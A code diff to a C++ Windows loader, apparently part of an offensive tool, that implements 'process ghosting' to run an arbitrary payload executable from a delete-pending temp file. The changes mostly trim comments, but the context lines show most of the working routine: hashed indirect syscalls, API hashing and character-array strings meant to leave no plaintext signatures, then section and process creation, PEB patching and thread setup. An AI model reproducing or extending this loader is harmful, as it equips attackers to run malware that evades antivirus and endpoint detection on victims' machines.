@@ -4,17 +4,7 @@
 #include "Utils/helpers.h"
 #include <cstddef>
 
-// =====================================================================
-// Process Ghosting - Refactored for project architecture
-//
-// - All Nt* calls via indirect syscalls (GetSSNByHash + IndirectSyscall)
-// - Rtl* functions resolved via GetProcAddressByHash
-// - Win32 APIs via API_TABLE singleton
-// - Zero plaintext function strings
-// - No printf output
-// =====================================================================
-
-// ----- Syscall hashes (Nt* functions) -----
+//Syscall hashes (Nt* functions)
 #define HASH_NtCreateFile              0x18A7B1B2FB2E2AFBULL
 #define HASH_NtWriteFile               0x8C6245C2AEFC20D2ULL
 #define HASH_NtSetInformationFile      0xF74FD0B30EFD1299ULL
@@ -27,12 +17,12 @@
 #define HASH_NtAllocateVirtualMemory   0x0E7C8C07D724ED6CULL
 #define HASH_NtCreateThreadEx          0xA3BEFC8698C66F50ULL
 
-// ----- Rtl* function hashes (resolved via GetProcAddressByHash) -----
+//Rtl* function hashes (resolved via GetProcAddressByHash) -----
 #define HASH_RtlCreateProcessParametersEx 0xFD9CFECB2E93AADBULL
 #define HASH_RtlDestroyProcessParameters  0x662F3246B36FF634ULL
 #define HASH_NTDLL                        0xE1193D187E7EA30DULL
 
-// ----- NT constants -----
+//NT constants
 #ifndef NtCurrentProcess
 #define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
 #endif
@@ -96,7 +86,7 @@ typedef struct _GHOST_PROCESS_PARAMS {
 static_assert(offsetof(GHOST_PROCESS_PARAMS, Environment) == 0x80,
     "GHOST_PROCESS_PARAMS::Environment offset mismatch");
 
-// ----- Rtl function typedefs -----
+//Rtl function typedefs
 typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
     PGHOST_PROCESS_PARAMS*, PUNICODE_STRING, PUNICODE_STRING,
     PUNICODE_STRING, PUNICODE_STRING, PVOID, PUNICODE_STRING,
@@ -107,7 +97,7 @@ typedef NTSTATUS(NTAPI* fnRtlDestroyProcessParameters)(
     PGHOST_PROCESS_PARAMS
 );
 
-// ----- Inline syscall helper -----
+//Inline syscall helper 
 // Wraps the 3-step pattern into a clean call
 static inline NTSTATUS SyscallNt(QWORD hash,
     ULONG_PTR a1 = 0, ULONG_PTR a2 = 0, ULONG_PTR a3 = 0,
@@ -126,7 +116,7 @@ static inline NTSTATUS SyscallNt(QWORD hash,
 // =====================================================================
 NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
 
-    // --- Validate PE ---
+    //Validate PE
     if (!payloadBuffer || payloadSize < sizeof(IMAGE_DOS_HEADER))
         return STATUS_UNSUCCESSFUL;
 
@@ -141,7 +131,7 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
     if (pNt->Signature != IMAGE_NT_SIGNATURE)
         return STATUS_UNSUCCESSFUL;
 
-    // --- Resolve Rtl functions from ntdll via hash ---
+    //Resolve Rtl functions from ntdll via hash 
     HMODULE hNtdll = (HMODULE)GetModuleBaseByHash(HASH_NTDLL);
     if (!hNtdll) return STATUS_UNSUCCESSFUL;
 
@@ -153,11 +143,11 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
     if (!pRtlCreateProcessParametersEx || !pRtlDestroyProcessParameters)
         return STATUS_UNSUCCESSFUL;
 
-    // --- Get API table for Win32 helpers ---
+    //Get API table for Win32 helpers
     API_TABLE& API = GetAPI();
 
-    // --- Build temp file path (no plaintext strings) ---
-    // env var name: "TEMP"
+    //Build temp file path 
+    // env var name: TEMP
     wchar_t envTemp[] = { 'T','E','M','P','\0' };
     wchar_t tempDir[MAX_PATH] = { 0 };
     API.GetEnvironmentVariableW(envTemp, tempDir, MAX_PATH);
@@ -165,7 +155,7 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
     // ghost filename: "ghost.exe"
     wchar_t ghostName[] = { 'g','h','o','s','t','.','e','x','e','\0' };
 
-    // NT prefix: "\??\"
+    //NT prefix
     wchar_t ntPrefix[] = { '\\','?','?','\\','\0' };
 
     // Build NT path: \??\C:\...\Temp\ghost.exe
@@ -190,10 +180,8 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
     HANDLE hThread  = NULL;
     NTSTATUS status;
 
-    // =========================================================
     // PHASE 1: FILE OBJECT (I/O Manager)
     // NtCreateFile -> NtSetInformationFile(DeletePending) -> NtWriteFile
-    // =========================================================
 
     UNICODE_STRING uPath;
     mRtlInitUnicodeString(&uPath, ntFilePath);
@@ -254,10 +242,8 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
         if (status != 0) goto cleanup;
     }
 
-    // =========================================================
     // PHASE 2: SECTION OBJECT (Memory Manager)
     // NtCreateSection with SEC_IMAGE
-    // =========================================================
 
     status = SyscallNt(HASH_NtCreateSection,
         (ULONG_PTR)&hSection,
@@ -278,10 +264,8 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
     SyscallNt(HASH_NtClose, (ULONG_PTR)hFile);
     hFile = NULL;
 
-    // =========================================================
     // PHASE 4: PROCESS CREATION (Process Manager)
     // NtCreateProcessEx with SectionHandle
-    // =========================================================
 
     status = SyscallNt(HASH_NtCreateProcessEx,
         (ULONG_PTR)&hProcess,
@@ -296,12 +280,11 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
     );
     if (status != 0) goto cleanup;
 
-    // =========================================================
     // PHASE 5: OS LOADER SIMULATION
     // PEB -> ImageBase -> EntryPoint -> Params -> Thread
-    // =========================================================
+
     {
-        // 5a: Query PEB address
+        //Query PEB address
         PROCESS_BASIC_INFORMATION pbi = { 0 };
         ULONG retLen = 0;
 
@@ -316,7 +299,7 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
 
         PPEB remotePeb = pbi.PebBaseAddress;
 
-        // 5b: Read ImageBaseAddress from PEB
+        //Read ImageBaseAddress from PEB
         PVOID imageBase = NULL;
         SIZE_T bytesRead = 0;
 
@@ -329,7 +312,7 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
         );
         if (status != 0) goto cleanup;
 
-        // 5c: Read PE headers from remote process -> find EntryPoint
+        //Read PE headers from remote process -> find EntryPoint
         BYTE headerBuf[0x1000];
 
         status = SyscallNt(HASH_NtReadVirtualMemory,
@@ -349,7 +332,7 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
 
         PVOID entryPoint = (PVOID)((ULONG_PTR)imageBase + rNt->OptionalHeader.AddressOfEntryPoint);
 
-        // 5d: Create process parameters
+        //Create process parameters
         UNICODE_STRING uImagePath, uDllPath, uCurrentDir, uCmdLine, uTitle;
 
         mRtlInitUnicodeString(&uImagePath, dosPath);
@@ -379,7 +362,7 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
         );
         if (status != 0) goto cleanup;
 
-        // 5e: Write params to remote process at SAME virtual address
+        //Write params to remote process at SAME virtual address
         SIZE_T pageOffset = (ULONG_PTR)processParams & 0xFFF;
         PVOID remoteAllocBase = processParams;
         SIZE_T remoteAllocSize = (SIZE_T)processParams->MaximumLength + pageOffset;
@@ -418,7 +401,7 @@ NTSTATUS GhostExecute(PVOID payloadBuffer, SIZE_T payloadSize) {
             if (envOffset >= processParams->MaximumLength) {
                 PVOID envLocal = processParams->Environment;
 
-                // Calculate env size (double-null terminated wide strings)
+                // Calculate env size 
                 PWCHAR pEnv = (PWCHAR)envLocal;
                 SIZE_T idx = 0;
                 while (pEnv[idx] != L'\0') {
